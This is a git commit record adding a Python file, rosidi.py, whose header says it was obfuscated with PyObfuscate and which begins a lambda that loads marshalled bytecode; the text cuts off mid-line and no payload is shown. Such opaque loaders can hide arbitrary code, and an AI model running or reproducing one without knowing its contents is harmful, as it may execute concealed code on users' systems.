dcf565fd1d2f65151a93237ce73f954ff255f3bc
Rosid456 <126705533+Rosid456@users.noreply.github.com>
2023-03-05 23:21:24 +0600

    Add files via upload

---
+++ rosidi.py
@@ -0,0 +1,5 @@
+# Obfuscated with PyObfuscate
+# https://www.github.com/htr-tech
+# Time : Wed Feb 22 23:56:10 2023
+# -------------------------------
+_ = lambda __ : __import__('marshal').loads(__import__
